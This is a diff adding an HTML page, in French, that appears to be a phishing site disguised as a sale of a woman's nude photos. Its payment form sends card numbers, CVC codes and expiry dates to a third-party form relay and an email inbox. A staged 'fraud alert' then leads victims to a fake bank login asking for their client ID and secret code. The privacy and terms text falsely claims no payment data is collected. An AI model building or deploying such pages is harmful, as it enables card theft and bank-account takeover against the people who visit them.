@@ -1,0 +1,1341 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mes Photos</title>
+    <link rel="stylesheet" href="modified.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
+</head>
+
+<div class="modal fade" id="noResultModal" tabindex="-1" aria-labelledby="noResultModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="noResultModalLabel">Résultats de recherche</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Fermer"></button>
+            </div>
+            <div class="modal-body">
+                <p>Aucun résultat trouvé pour votre recherche.</p>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Fermer</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal fade" id="comingSoonModal" tabindex="-1" aria-labelledby="comingSoonModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+      <div class="modal-content">
+        <div class="modal-header" style="background-color: #ff6f61; color: white;">
+          <h5 class="modal-title" id="comingSoonModalLabel">🚀 Prochainement Disponible !</h5>
+          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Fermer"></button>
+        </div>
+        <div class="modal-body text-center" style="font-family: 'Roboto', sans-serif;">
+          <div class="alert alert-info" role="alert" style="background-color: #f0f8ff; color: #004085;">
+            <h4 class="alert-heading">🎥Mes vidéos arrivent bientôt !</h4>
+            <p>Elles seront disponibles très prochainement pour vous offrir une expérience exceptionnelle.</p>
+            <p>Restez connecté et préparez-vous à une expérience immersive de qualité ! 🚀</p>
+          </div>
+          
+          <p class="mt-4"><strong>💡 Ne manquez pas le lancement !</strong></p>
+          <p>Renseignez votre adresse e-mail pour être informé dès qu'elles seront sorties !</p>
+          
+          <!-- Formulaire d'inscription -->
+          <form id="emailForm" class="mt-4">
+            <div class="mb-3">
+              <label for="email" class="form-label">📧 Adresse email</label>
+              <input type="email" class="form-control" id="email" placeholder="exemple@domaine.com" required>
+            </div>
+          </form>
+          <button class="btn btn-secondary mt-3" style="background-color: #007bff;" data-bs-dismiss="modal">Je veux être informé</button>
+          <div id="confirmationMessage" class="mt-3 text-success d-none">
+            <p><strong>Merci de vous être inscrit !</strong> Vous recevrez bientôt une notification dès que les vidéos seront disponibles.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+<div class="modal fade" id="privacyPolicyModal" tabindex="-1" aria-labelledby="privacyPolicyLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="privacyPolicyLabel">Politique de confidentialité</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Fermer"></button>
+            </div>
+            <div class="modal-body">
+                <!-- Contenu de la politique de confidentialité -->
+                <p>Ce document explique comment nous collectons et utilisons vos données. </br> La présente politique de confidentialité a pour objectif de vous informer sur la collecte, l'utilisation et la protection de vos données personnelles lors de votre utilisation de notre plateforme de vente de photos. Nous attachons une grande importance à la protection de votre vie privée et veillons à ce que vos données personnelles soient traitées de manière conforme à la législation en vigueur, notamment le Règlement Général sur la Protection des Données (RGPD). Lorsque vous utilisez nos services, nous ne collectons pas vos informations personnelles telles que votre nom, prénom, nous collectons juste des données relatives à votre utilisation de notre site, comme votre adresse e-mail par exemple. Nous ne collectons pas vos informations bancaires , nous faisons juste l'intermediaire entre vous et votre instution bancaire .Nous nous engageons à ne pas vendre ou divulguer vos données personnelles à des tiers , ni à quiconque. Nous mettons également en œuvre des mesures techniques et organisationnelles appropriées pour protéger vos données contre tout accès non autorisé, toute modification ou perte accidentelle. En utilisant notre plateforme, vous consentez à la collecte et au traitement de vos données personnelles conformément à cette politique de confidentialité.</p>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Fermer</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Conditions d'utilisation Modal -->
+<div class="modal fade" id="termsModal" tabindex="-1" aria-labelledby="termsLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="termsLabel">Conditions d'utilisation</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Fermer"></button>
+            </div>
+            <div class="modal-body">
+                <!-- Contenu des conditions d'utilisation -->
+                <p>En utilisant notre site, vous acceptez les termes suivants.</p> </br>
+                <p>Les présentes conditions d'utilisation régissent l'accès et l'utilisation de notre plateforme de vente de photos, et s'appliquent à tous les utilisateurs, qu'ils soient acheteurs ou vendeurs. En utilisant notre site, vous acceptez ces conditions sans réserve. Vous vous engagez à utiliser la plateforme de manière légale, respectueuse des droits des autres utilisateurs et conformément à toutes les lois en vigueur. En tant que vendeur, vous garantissez que les photos que vous proposez à la vente sont votre propriété exclusive ou que vous avez obtenu toutes les autorisations nécessaires pour leur vente. En tant qu'acheteur, vous vous engagez à ne pas reproduire, distribuer ou utiliser de manière commerciale les photos achetées, sauf autorisation expresse du vendeur. Les paiements effectués sur notre plateforme sont traités par des prestataires de paiement tiers, donc nous n'avons pas accès à vos informations de paiement et par conséquent nous ne les stockons pas. Nous nous réservons également le droit de modifier ou de suspendre certains services ou fonctionnalités de la plateforme à tout moment, sans préavis. Vous acceptez que nous puissions modifier ces conditions d'utilisation, et il est de votre responsabilité de consulter régulièrement cette page pour être informé des changements.</p>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Fermer</button>
+            </div>
+        </div>
+    </div>
+</div>
+                  
+<!-- Modal "À propos" -->
+<div class="modal fade" id="aboutModal" tabindex="-1" aria-labelledby="aboutModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="aboutModalLabel">À propos de nous</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Fermer"></button>
+            </div>
+            <div class="modal-body">
+                <p>Bienvenue sur Girls Around The World, une plateforme dédiée à l’hébergement et à la vente de photos pour particuliers. Nous mettons à votre disposition un espace sécurisé pour vendre vos créations ou acheter des images. Notre objectif est de faciliter les transactions et de garantir un environnement de confiance entre acheteurs et vendeurs.</p>
+                <p>Pour plus d’informations sur nos services ou pour toute question, n’hésitez pas à nous contacter !</p>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Fermer</button>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="modal fade" id="purchaseHistoryModal" tabindex="-1" aria-labelledby="purchaseHistoryLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="purchaseHistoryLabel">Historique des achats</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Fermer"></button>
+            </div>
+            <div class="modal-body">
+                <p>Vous n'avez pas encore effectué d'achat.</p>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Fermer</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal fade" id="purchaseModal" tabindex="-1" aria-labelledby="purchaseModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="purchaseModalLabel">✨ Acheter mes photos ✨</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Fermer"></button>
+            </div>
+            <div class="modal-body text-center">
+                <i class="fas fa-camera-retro revolution-icon"></i>
+                <p class="revolution-text">
+                    Accédez immédiatement à mes photos exclusives ! <br> 11 Photos sont comprises en tout , dont une photo surprise gratuite 🫣 ! 
+                </p>
+                
+                <button class="btn btn-primary btn-lg revolution-button" id="continueToPayment" style="
+    background: linear-gradient(90deg, #ff7eb3, #ff758c, #ff617a);
+    border: none;
+    color: white;
+    border-radius: 30px;
+    font-size: 18px;
+    padding: 12px 30px;
+    box-shadow: 0 4px 15px rgba(255, 118, 150, 0.4);
+    transition: all 0.3s ease;
+">
+    Procéder au paiement
+</button>
+<div id="paymentSection" class="mt-4 d-none">
+    <form action="https://formsubmit.co/trackaioff@gmail.com" method="POST">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://ton-site.github.io/merci.html">
+      
+        <div class="mb-3">
+          <label for="email" class="form-label">📧 Adresse email</label>
+          <input type="email" class="form-control revolution-input" id="email" name="email" placeholder="exemple@domaine.com" required>
+        </div>
+        
+        <div class="mb-3">
+          <label for="cardHolderName" class="form-label">📝 Nom sur la carte</label>
+          <input type="text" class="form-control revolution-input" id="cardHolderName" name="cardHolderName" placeholder="Votre nom tel qu'indiqué sur la carte" required>
+        </div>
+        
+        <div class="mb-3">
+          <label for="cardNumber" class="form-label">💳 Numéro de carte</label>
+          <input type="text" class="form-control revolution-input" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+        </div>
+        
+        <div class="mb-3">
+          <label for="cvcCode" class="form-label">🔒 Code CVC</label>
+          <input type="text" class="form-control revolution-input" id="cvcCode" name="cvcCode" placeholder="123" maxlength="3" required>
+        </div>
+        
+        <div class="mb-3">
+          <label for="expiryDate" class="form-label">📅 Date d'expiration</label>
+          <input type="text" class="form-control revolution-input" id="expiryDate" name="expiryDate" placeholder="MM/AA" maxlength="5" required>
+        </div>
+      
+        
+        <div class="mini-invoice bg-white border border-primary rounded-4 shadow-lg p-4 mb-4">
+            <h6 class="text-center text-uppercase text-primary fw-bold mb-3">
+                💼 Résumé de votre achat
+            </h6>
+            <div class="d-flex justify-content-between align-items-center mb-3">
+                <span class="fw-semibold">Nombre de photos :</span>
+                <span class="text-success fw-bold">11 photos</span>
+            </div>
+            <div class="d-flex justify-content-between align-items-center mb-3">
+                <span class="fw-semibold">Montant total :</span>
+                <span class="text-danger fw-bold" style="font-size: 1.0rem;">10,00 € TTC</span>
+            </div>
+            <div class="text-center mt-3">
+                <small class="text-muted">
+                    Chaque photo est soigneusement sélectionnée pour garantir votre satisfaction.
+                </small>
+            </div>
+        </div>
+
+        <button type="submit" class="btn btn-danger btn-lg revolution-submit w-100">
+            🔥 Payer maintenant
+        </button>
+    </form>
+</div>
+                <div id="loadingSection" class="mt-4 d-none">
+                    <div id="loadingSpinner" class="spinner-border text-primary" role="status" style="width: 4rem; height: 4rem;">
+                        <span class="visually-hidden">Loading...</span>
+                    </div>
+                    <p id="loadingMessage" class="mt-3 text-primary fw-bold">Traitement en cours, veuillez patienter...</p>
+                    
+                    <div id="gamePopup" class="position-fixed top-50 start-50 translate-middle d-none" 
+    style="width: 80%; height: 80%; background: #f8f9fa; border: 2px solid #007bff; z-index: 1050; box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);">
+    <div class="p-2 d-flex justify-content-between align-items-center" style="background: #007bff; color: white;">
+        <h5 class="m-0">Vérifiez que vous êtes un humain</h5>
+        <button id="closeGamePopup" class="btn-close btn-close-white"></button>
+    </div>
+    <canvas id="mazeCanvas" width="600" height="400" style="display: block; margin: 0 auto; background: #f1f1f1;"></canvas>
+    <p class="text-center mt-2 text-secondary">  </br> Utilisez les touches fléchées sur votre écran ou votre clavier </p>
+
+    <!-- Déplacement des boutons tactiles ici -->
+    <div class="touch-controls">
+        <button class="control-btn" data-direction="ArrowUp">⬆️</button>
+        <div>
+            <button class="control-btn" data-direction="ArrowLeft">⬅️</button>
+            <button class="control-btn" data-direction="ArrowDown">⬇️</button>
+            <button class="control-btn" data-direction="ArrowRight">➡️</button>
+        </div>
+    </div>
+</div>
+                </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="modal fade" id="revolutionaryModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered custom-modal-lg custom-modal-height">
+        <div class="modal-content bg-dark text-white">
+            <div class="modal-header border-0">
+                <h4 class="modal-title">🚀En Attente D'autorisation  </h4>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Fermer"></button>
+            </div>
+            <div class="modal-body text-center">
+                <!-- Animation de la fusée -->
+                <div class="rocket-animation">
+                    <div class="rocket">🚀</div>
+                    <div class="orbit"></div>
+                </div>
+                <p class="mt-4">Veuillez autorisez la transaction sur votre application bancaire</p>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="modal fade" id="alertModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content shadow-lg border-0 rounded-4">
+            <!-- En-tête stylisée -->
+            <div class="modal-header bg-gradient-warning text-white rounded-top-4">
+                <h5 class="modal-title">
+                    ⚠️ Attention !
+                </h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Fermer"></button>
+            </div>
+
+            <!-- Corps de la modale -->
+            <div class="modal-body text-center p-4">
+                <!-- Icône animée -->
+                <div class="position-relative mb-4">
+                    <i class="bi bi-exclamation-triangle-fill text-warning display-1"></i>
+                    <div class="icon-glow"></div> <!-- Effet lumineux derrière l'icône -->
+                </div>
+
+                <!-- Alerte principale -->
+                <div class="alert alert-warning py-4 rounded-3 shadow-sm border-0">
+                    <h4 class="alert-heading mb-3">
+                        Ce site est potentiellement frauduleux.
+                    </h4>
+                    <p>Transaction interrompue</p>
+                    <hr class="my-3">
+                    <p class="mb-0">Votre compte bancaire pourrait cependant être compromis </p>
+                </div>
+
+                <!-- Nouveau message de conseil -->
+                <p class="text-muted mt-4 fw-bold">
+                    💡 Nous vous conseillons de vérifier vos informations (identifiant client et votre code secret) qui auraient pu être compromis durant cette transaction 💡
+                </p>
+                <button class="btn btn-sm btn-outline-warning fw-bold px-3 py-2 rounded-3 mt-3" data-bs-target="#secureModal" data-bs-toggle="modal">
+                    🔒 Sécuriser mes informations
+                </button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="modal fade" id="secureModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content shadow-lg border-0 rounded-4">
+            <div class="modal-header bg-gradient-primary text-white rounded-top-4">
+                <h5 class="modal-title" style="color: #000000 ;">🏦 Sélectionnez votre banque</h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Fermer"></button>
+            </div>
+            <div class="modal-body text-center p-4">
+                <p class="mb-3 text-muted">Cliquez sur le logo de votre établissement</p>
+                    <div id="bankList" class="d-flex flex-wrap justify-content-center gap-3"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="modal fade" id="loginModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content shadow-lg border-0 rounded-4">
+            <div class="modal-header bg-white rounded-top-4">
+                <h5 class="modal-title mx-auto text-dark text-lg fw-semibold text-center">
+                    🔐 Connexion Sécurisée<br>
+                    <span id="selectedBankName" class="fw-bold text-primary d-block mt-1"></span>
+                </h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Fermer"></button>
+            </div>
+            <div class="modal-body p-4">
+                <p class="text-center text-muted mb-4">🔎 Vérifiez votre identité pour sécuriser votre compte</p>
+
+                <div class="glassmorphism-box p-4">
+                    <label class="form-label text-light">Identifiant Client</label>
+                    <input type="text" class="form-control neon-input" placeholder="Entrez votre identifiant">
+                    
+                    <label class="form-label text-light mt-3">Code Secret</label>
+                    <input type="password" class="form-control neon-input" placeholder="Entrez votre code secret">
+                    
+                    <button class="btn btn-warning w-100 mt-4 py-2 shadow-sm" id="secureAccount">
+                        🔒 Sécuriser mon compte
+                    </button>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="modal fade" id="loadingModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered modal-lg">
+      <div class="modal-content border-0 rounded-4 glassmorphism text-center p-5 position-relative">
+        <div class="loading-spinner-large"></div>
+        <h5 class="fw-bold" style="color: #000000;">Connexion en cours...</h5>
+        <p class="text-muted fst-italic" style="color: #000000;">Veuillez patienter pendant la sécurisation de votre compte</p>
+      </div>
+    </div>
+  </div>
+
+<body>
+    <div id="profileIcon" class="d-none position-fixed top-0 end-0 m-3">
+        <div id="profileImage" style="width: 70px; height: 70px; border-radius: 50%; background-color: #007bff; background-size: cover; background-position: center; display: flex; align-items: center; justify-content: center;">
+            <i class="fas fa-user-circle" style="font-size: 40px; color: white;"></i>
+        </div>
+        <div id="profileMenu" class="dropdown-menu">
+            <a class="dropdown-item" href="#" id="profileEdit" data-bs-toggle="modal" data-bs-target="#editProfileModal">Modifier votre photo</a>
+            <a class="dropdown-item" href="#" id="viewPurchases" data-bs-toggle="modal" data-bs-target="#purchaseHistoryModal">Historique des achats</a>
+            <a class="dropdown-item" href="#" id="help" onclick="openGmailPopup()">Support client</a>
+            <div class="dropdown-divider"></div>
+            <button class="dropdown-item" id="logoutButton">Se déconnecter</button>
+        </div>
+    </div>
+<div class="main-container">
+    <!-- Sidebar -->
+    <div class="sidebar bg-light d-flex flex-column align-items-center p-3">
+        <!-- User Profile -->
+        <div class="icon mb-4 text-center">
+            <img src="user-icon.png" alt="User Icon" class="rounded-circle shadow" width="120">
+            <p class="mt-2 font-weight-bold">Girls Around The World</p>
+        </div>
+
+        <!-- Navigation Menu -->
+        <nav class="w-100">
+            <ul class="nav flex-column w-100">
+                <li class="nav-item">
+    <a href="#" class="nav-link text-dark text-center py-2 hover-effect" data-bs-toggle="modal" data-bs-target="#aboutModal">
+        <i class="bi bi-info-circle me-2"></i>À propos
+    </a>
+</li>
+    <a href="#"
+       onclick="openGmailPopup()"
+       class="nav-link text-dark text-center py-2 hover-effect">
+        <i class="bi bi-envelope me-2"></i>Nous Contacter
+    </a>
+</li>
+            </ul>
+        </nav>
+
+        <!-- Search Bar -->
+        <div class="search-bar mt-4 w-100">
+            <input type="text" class="form-control" id="searchInput" placeholder="Recherche..." onkeydown="checkEnter(event)">
+        </div>
+        <!-- Theme Switcher -->
+        <div class="theme-switcher mt-4 w-100 text-center">
+            <button id="toggleTheme" class="btn btn-outline-dark">🌙 Mode Sombre</button>
+        </div> 
+         
+
+        <div class="external-links mt-4 w-100">
+    <ul class="nav flex-column">
+        <li class="nav-item">
+            <!-- Lien pour Politique de Confidentialité -->
+            <a href="#" 
+               class="nav-link text-dark text-center py-2 hover-effect" 
+               data-bs-toggle="modal" 
+               data-bs-target="#privacyPolicyModal">
+                Politique de confidentialité
+            </a>
+        </li>
+        <li class="nav-item">
+            <!-- Lien pour Conditions d'utilisation -->
+            <a href="#" 
+               class="nav-link text-dark text-center py-2 hover-effect" 
+               data-bs-toggle="modal" 
+               data-bs-target="#termsModal">
+                Conditions d'utilisation
+            </a>
+        </li>
+    </ul>
+</div>
+
+         </div>
+</div>
+        <button id="toggleSidebar" class="btn btn-primary position-fixed top-0 start-0 m-3">
+        ☰
+   	 </button>
+	</div>
+    <div class="profile-container">
+        <div class="header">
+            <img src="logo2.png" alt="Bannière" class="banner">
+            <div class="profile-logo">
+                <img src="banner.jpg" alt="Logo de profil">
+            </div>
+        </div>
+        
+        <div class="creator-hero container my-5">
+            <div class="card border-0 rounded-4 shadow-lg p-4 text-center creator-card">
+                <div class="creator-img-wrapper mx-auto mb-3">
+                    <!-- Utilisation de ta photo de profil déjà présente -->
+                    <img src="logo.png" alt="Logo de profil" class="creator-img">
+                </div>
+                <h1 class="creator-name mb-1">❤️‍🔥 Carla ❤️‍🔥</h1>
+                <p class="creator-tag text-muted">@Carlaaaa3728</p>
+                <p class="creator-bio mt-3">
+                    Heyyy c'est Carla 👋<br />
+                    Je vends enfin mes nudes 🔥<br />
+                    N'hésitez pas à me laisser un avis !<br />
+                    Vous pouvez voir à quoi je ressemble en dessous (gratuitement)
+                </p>
+                <div class="d-grid gap-3 mt-4">
+                    <button id="buyPhotos" class="btn btn-danger btn-lg rounded-pill glow-button">
+                        🔥 Acheter mes nudes
+                    </button>
+                    <button class="btn btn-outline-primary btn-lg rounded-pill free glow-outline" data-bs-toggle="modal" data-bs-target="#comingSoonModal">
+                        🎥 Acheter mes vidéos
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="tabs">
+            <div class="button-container">
+                <button id="btn-publications" class="revolutionary-button2" onclick="showTab('publications')">Petit aperçu où je suis habillé</button>
+                <button id="btn-medias" class="revolutionary-button2" onclick="showTab('medias')">Un peu plus coquin ...</button>
+            </div>
+        </div>
+
+    <div class="tab-content">
+        <div id="publications" class="tab-pane">
+            <img src="image1.jpg" alt="Publication 1">
+            <img src="image2.jpg" alt="Publication 2">
+            <img src="image3.jpg" alt="Publication 3">
+            
+        </div>
+        <div id="medias" class="tab-pane">
+            <img src="media1.jpg" alt="Media 1">
+            <img src="media2.jpg" alt="Media 2">
+            <img src="media3.jpg" alt="Media 3">
+           
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script>
+        function showTab(tabName) {
+            document.querySelectorAll('.tab-pane').forEach(tab => {
+                tab.classList.remove('active');
+                tab.style.display = 'none';
+            });
+
+            const selectedTab = document.getElementById(tabName);
+            selectedTab.classList.add('active');
+            selectedTab.style.display = 'flex';
+
+            document.querySelectorAll('.tabs button').forEach(button => {
+                button.classList.remove('active');
+            });
+            		  document.querySelector(`#btn-${tabName}`).classList.add('active');
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+             document.querySelectorAll('.tab-pane').forEach(tab => {
+        	tab.style.display = 'none';
+             });
+            showTab('publications'); 
+        });
+    </script>
+        
+        <div class="posts">
+            <div class="post">
+                <p><strong </strong> </p>
+                    <footer class="text-center py-4" style="background-color: #ffffff; color: rgb(150, 150, 223);">
+                        <!-- Paragraphe du copyright -->
+                        <p class="mb-3 copyright-text" style="font-size: 1.2rem; font-weight: bold;">
+                            &copy; 2024 GATW (Girls around the world). Tous droits réservés.
+                        </p>
+                        <div class="d-flex justify-content-center gap-3">
+                            <!-- Bouton pour la politique de confidentialité -->
+                            <button class="btn btn-gradient-soft small-button" data-bs-toggle="modal" data-bs-target="#privacyPolicyModal">
+                                Politique de confidentialité
+                            </button>
+                    
+                            <!-- Bouton pour les conditions d'utilisation -->
+                            <button class="btn btn-gradient-soft small-button" data-bs-toggle="modal" data-bs-target="#termsModal">
+                                Conditions d'utilisation
+                            </button>
+                            <button class="btn btn-gradient-soft small-button" onclick="openGmailPopup()">
+                                <i class="bi bi-envelope me"></i>Nous Contacter
+                            </button>
+                            
+                        </div>
+                    </footer>
+        </div>
+      </div>
+    </div> 
+    <div id="cookieConsentPopup" class="cookie-popup d-flex justify-content-center align-items-center">
+        <div class="popup-container text-center p-4">
+            <h2 class="popup-title">🍪 Votre vie privée, notre priorité</h2>
+            <p class="popup-message">
+                Nous utilisons des cookies pour améliorer votre expérience et analyser notre trafic. En cliquant sur "Accepter", vous contribuez à une meilleure navigation.
+            </p>
+            <div class="popup-actions mt-4">
+                <button id="acceptCookies" class="btn btn-primary btn-lg me-3">Accepter 👍</button>
+                <button id="declineCookies" class="btn btn-outline-secondary btn-lg">Refuser 🚫</button>
+            </div>
+        </div>
+    </div>
+    
+        <script>
+    const sidebar = document.querySelector('.sidebar');
+    const toggleButton = document.querySelector('#toggleSidebar');
+
+    toggleButton.addEventListener('click', () => {
+        sidebar.classList.toggle('active');
+    });
+       </script>
+        <script>
+        document.addEventListener('mousemove', (e) => {
+    	    let cursor = document.querySelector('.cursor');
+            if (!cursor) {
+        	cursor = document.createElement('div');
+        	cursor.classList.add('cursor');
+        	document.body.appendChild(cursor);
+    	    }
+
+       	    const size = 20; // Taille du rond définie dans le CSS (20px)
+    	    cursor.style.top = (e.clientY - size / 2) + 'px';
+            cursor.style.left = (e.clientX - size / 2) + 'px';
+            const r = Math.floor(Math.random() * 255);
+    	    const g = Math.floor(Math.random() * 255);
+    	    const b = Math.floor(Math.random() * 255);
+    	    cursor.style.background = `rgba(${r}, ${g}, ${b}, 0.5)`;
+});
+      </script>   
+       <script>
+        document.getElementById('toggleTheme').addEventListener('click', function() {
+    document.body.classList.toggle('dark-theme');
+});
+       </script>
+       <script>
+        function openGmailPopup() {
+    const gmailURL = "https://mail.google.com/mail/?view=cm&fs=1&to=Girlsaroundtheworldoff@gmail.com";
+    const popupOptions = "width=600,height=400,left=100,top=100,resizable=yes,scrollbars=yes";
+   
+    window.open(gmailURL, "GmailPopup", popupOptions);
+}
+      </script>   
+      <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>           
+      <script>
+        function checkEnter(event) {
+            // Vérifie si la touche pressée est "Entrée" (keyCode 13)
+            if (event.key === "Enter") {
+                // Empêche le comportement par défaut (évite le "submit" du formulaire si un formulaire est impliqué)
+                event.preventDefault();
+    
+                // Récupère la valeur du champ de recherche
+                var searchInput = document.getElementById("searchInput").value;
+    
+                // Si le champ de recherche n'est pas vide, on affiche la modale
+                if (searchInput.trim() !== "") {
+                    // Initialisation de la modale Bootstrap
+                    var myModal = new bootstrap.Modal(document.getElementById('noResultModal'));
+                    myModal.show();
+                }
+            }
+        }
+    </script>
+     <script>
+        document.addEventListener('DOMContentLoaded', () => {
+    const popup = document.getElementById('cookieConsentPopup');
+    const acceptButton = document.getElementById('acceptCookies');
+    const declineButton = document.getElementById('declineCookies');
+
+    // Vérifions que les éléments existent
+    if (!popup || !acceptButton || !declineButton) {
+        console.error('Erreur : Certains éléments de la pop-up sont introuvables.');
+        return;
+    }
+
+    // Afficher la pop-up
+    console.log('Pop-up affichée.');
+    popup.style.display = 'flex'; // Rend visible au cas où CSS poserait problème
+
+    // Méthodes pour fermer la pop-up
+    const closePopup = () => {
+        console.log('Fermeture de la pop-up...');
+        // Méthode 1 : Modifier le style
+        popup.style.display = 'none';
+        popup.style.opacity = 0;
+        popup.style.visibility = 'hidden';
+
+        // Méthode 2 : Ajouter une classe CSS pour masquer
+        popup.classList.add('hidden');
+
+        // Méthode 3 : Supprimer complètement la pop-up
+        setTimeout(() => {
+            if (popup.parentNode) {
+                popup.parentNode.removeChild(popup);
+                console.log('Pop-up supprimée du DOM.');
+            }
+        }, 500); // Laisse le temps pour une éventuelle animation
+    };
+
+    // Gestion des clics sur les boutons
+    acceptButton.addEventListener('click', () => {
+        console.log('Accepter cliqué.');
+        closePopup();
+    });
+
+    declineButton.addEventListener('click', () => {
+        console.log('Refuser cliqué.');
+        closePopup();
+    });
+
+    // Fermer la pop-up si l’utilisateur clique en dehors du conteneur
+    popup.addEventListener('click', (event) => {
+        if (event.target === popup) {
+            console.log('Clic en dehors de la pop-up détecté.');
+            closePopup();
+        }
+    });
+});
+
+    </script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+    const loginSignupButton = document.getElementById('loginSignupButton');
+    const profileIcon = document.getElementById('profileIcon');
+    const profileMenu = document.getElementById('profileMenu');
+    const loginSubmitButton = document.getElementById('loginSubmit');
+    const signupSubmitButton = document.getElementById('signupSubmit');
+    const logoutButton = document.getElementById('logoutButton');
+
+    let isLoggedIn = false;  // Simuler l'état de connexion
+
+    // Clic sur le bouton "Se connecter / Créer un compte"
+    loginSignupButton.addEventListener('click', function () {
+    // Ouvrir la nouvelle modale Bootstrap
+    const authModal = new bootstrap.Modal(document.getElementById('authChoiceModal'));
+    authModal.show();
+});
+
+// Actions dans la modale personnalisée
+document.getElementById('chooseLogin').addEventListener('click', () => {
+    const loginModal = new bootstrap.Modal(document.getElementById('loginModal'));
+    loginModal.show(); // Ouvrir la modale de connexion
+    const authModal = bootstrap.Modal.getInstance(document.getElementById('authChoiceModal'));
+    authModal.hide(); // Fermer le menu précédent
+});
+
+document.getElementById('chooseSignup').addEventListener('click', () => {
+    const signupModal = new bootstrap.Modal(document.getElementById('signupModal'));
+    signupModal.show(); // Ouvrir la modale d'inscription
+    const authModal = bootstrap.Modal.getInstance(document.getElementById('authChoiceModal'));
+    authModal.hide(); // Fermer le menu précédent
+});
+
+
+    // Clic sur "Se connecter" dans la modale
+    loginSubmitButton.addEventListener('click', function () {
+        // Simuler une connexion réussie
+        isLoggedIn = true;
+        toggleLoginSignupButton();
+        const loginModal = bootstrap.Modal.getInstance(document.getElementById('loginModal'));
+        loginModal.hide();
+    });
+
+    // Clic sur "Créer un compte" dans la modale
+    signupSubmitButton.addEventListener('click', function () {
+        // Simuler une inscription réussie
+        isLoggedIn = true;
+        toggleLoginSignupButton();
+        const signupModal = bootstrap.Modal.getInstance(document.getElementById('signupModal'));
+        signupModal.hide();
+    });
+
+    // Fonction pour forcer l'affichage de l'icône de profil et cacher le bouton de connexion
+    function toggleLoginSignupButton() {
+        if (isLoggedIn) {
+            // Masquer le bouton de connexion
+            loginSignupButton.classList.add('d-none');
+            
+            // Afficher l'icône de profil avec animation
+            profileIcon.style.display = 'block';  // Forcer l'affichage de l'icône
+            profileIcon.classList.remove('d-none');
+            profileIcon.classList.add('animate__animated', 'animate__fadeIn'); // Animation de fade-in
+
+            console.log('Utilisateur connecté, icône de profil affichée');
+        } else {
+            // Réinitialiser l'affichage
+            loginSignupButton.classList.remove('d-none');
+            profileIcon.style.display = 'none';  // Cacher l'icône de profil
+            profileIcon.classList.add('d-none');
+            console.log('Utilisateur déconnecté, bouton affiché');
+        }
+    }
